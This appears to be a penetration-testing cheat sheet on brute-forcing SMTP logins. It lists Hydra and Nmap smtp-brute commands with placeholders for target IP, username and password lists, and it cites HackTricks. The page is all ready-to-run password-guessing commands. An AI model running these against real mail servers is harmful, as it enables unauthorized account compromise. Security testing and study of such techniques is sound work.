# SMTP

## 01 - Hydra

`$ hydra -U smtp`

`$ hydra -V -l <username> -P passwords.lst <IP> smtp`

`$ hydra -S -v -V -l <username> -P passwords.lst -s 587 <IP>`

## 02 - Nmap

`$ nmap -p 25 --script smtp-brute --script-args smtp-brute.auth=<LOGIN | PLAIN | CRAM-MD5 | DIGEST-MD5 | NTLM>`

`$ nmap -p 25 --script smtp-brute --script-args smtp-brute.auth=LOGIN,userdb=users.lst,passdb=passwords.lst <IP>`

---
## References

- [Brute Force SMTP](https://book.hacktricks.xyz/brute-force#smtp)